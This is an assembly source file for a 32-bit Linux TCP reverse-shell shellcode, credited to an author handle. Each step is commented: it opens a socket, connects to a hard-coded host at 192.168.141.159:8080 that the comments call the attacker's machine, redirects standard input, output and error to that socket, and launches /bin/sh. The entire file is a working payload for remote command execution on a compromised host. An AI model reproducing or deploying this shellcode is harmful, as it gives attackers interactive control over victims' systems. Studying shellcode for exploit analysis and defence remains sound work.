;reverse_tcp.nasm
;
;A TCP reverse shellcode 
;
;Author : SALE -1459

global _start

section text

_start:
	xor eax,eax 	;clear eax
	xor ebx,ebx	;clear eax
	xor edx,edx	;clear eax

	; /* 1. Build a basic IP socket:	*/
	; server = socket(AF_INET, SOCK STREAM, 0);
	; int socketcall(int call, unsigned long *args);
	; #define	NR_socketcall	102
	; #define SYS_SOCKET	1

	push eax	; third arg to socket: 0
	push byte 0x1   ; second arg to socket: 1
	push byte 0x2   ; first arg to socket: 2
	mov  ecx,esp    ; move the ptr to the args to ecx (2nd arg to socketcall)
	inc  bl		; set first arg to socketcall to # 1
	mov  al,102	; call socketcall # 1: SYS_SOCKET
	int  0x80	; jump into kernel mode, execute the syscall
	mov  esi,eax	; store the return value (eax) into esi

	; /*2 . Connecting to attacker's machine: */

	; client = connect(server, (struct sockaddr *) &serv_addr, sizeof(struct sockaddr_in));
	; int socketcall(int call, unsigned long *args);
	; #define	NR_socketcall	102
	; #define SYS_CONNECT	3
      
	push edx             ; still zero, used to terminate the next value pushed
	push long 0x9f8da8c0 ; push the address in reverse hex "192.168.141.159"
	push word 0x901f     ; push the port onto the stack, 8080 in decimal
	xor  ecx, ecx        ; clear ecx to hold the sa_family field of struck
	mov  cl,2            ; move single byte:2 to the low order byte of ecx
	push word cx ;       ; build struct, use port,sin.family:0002 four bytes
	mov  ecx,esp         ; move addr struct (on stack) to ecx
	push byte 0x10       ; begin the connect args, push 16 stack
	push ecx             ; save address of struct back on stack
	push esi             ; save server file descriptor (esi) to stack
	mov  ecx,esp         ; store ptr to args to ecx (2nd arg of socketcall)
	mov  bl,3   	     ; set bl to # 3, first arg of socketcall
	mov  al,102          ; call socketcall # 3: SYS_CONNECT
	int  0x80 ; jump into kernel mode, execute the syscall

	; prepare for dup2 commands, need client file handle saved in ebx 

	mov ebx,esi          ; copied soc file descriptor of client to ebx

	;/* 3. Duplicate the file descriptors for STDIN, STDOUT, and STDERR to the srver socket*/ 

	; int dup2(int oldfd, int newfd); duplicates a file descriptor
	;#define NR_dup2 63
	;dup2(server, 0)

	xor ecx,ecx      ; clear ecx
	mov  al,63       ; set first arg of syscall to 63: dup2
	int  0x80        ; jump into

	;dup2(server, 1)

	inc  ecx         ; increment ecx to 1
	mov al,63        ; prepare for syscall to dup2:63
	int  0x80        ; jump into

	;dup2(server, 2)

	inc  ecx          ; increment ecx to 2
	mov  al,63        ; prepare for syscall to dup2:63
	int  0x80         ; jump into


	; /*  4. Call normal execve shellcode */

	; execve("/bin/sh", NULL, NULL); 
	; #define NR_execve 11
	;standard execvecibin/sh"...
	push edx
	push long 0x68732f2f 
	push long 0x6e69622f 
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp 
	mov al, 0x0b
	int 0x80


